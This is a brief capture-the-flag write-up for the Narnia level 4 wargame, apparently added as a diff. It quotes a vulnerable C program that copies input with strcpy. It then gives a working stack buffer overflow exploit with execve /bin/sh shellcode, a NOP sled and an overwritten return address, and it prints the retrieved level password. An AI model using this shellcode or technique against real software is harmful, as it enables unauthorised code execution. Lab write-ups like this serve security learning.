@@ -1,0 +1,37 @@
+int i;
+char buffer[256];
+
+for(i = 0; environ[i] != NULL; i++)
+    memset(environ[i], '\0', strlen(environ[i]));
+
+if(argc>1)
+    strcpy(buffer,argv[1]);
+
+return 0;
+
+so we have a buffer of 256, and the strcpy function again, okay bufferover flow ya good old
+friend.
+
+pretty much same technique used in narnia2.
+
+find the size of the payload with:
+inside gdb: r $(python -c 'print("A"*266)')
+we found out that the size of the payload should be 264 bytes. (overwritting the stack and ebp)
+reuse our shellcode:
+payload: 264
+shellcode: 28
+overwritten eip: 4
+
+r $(python -c 'print("A"*236+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"B"*4)')
+
+x/800xb $esp
+
+pick our target for the return address: 0xffffd870
+
+create payload:
+r $(python -c 'print("\x90"*236+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"\x70\xd8\xff\xff")')
+
+we got a new shell with new uid:
+
+cat /etc/narnia_pass/narnia5
+flag retrieved: faimahchiy
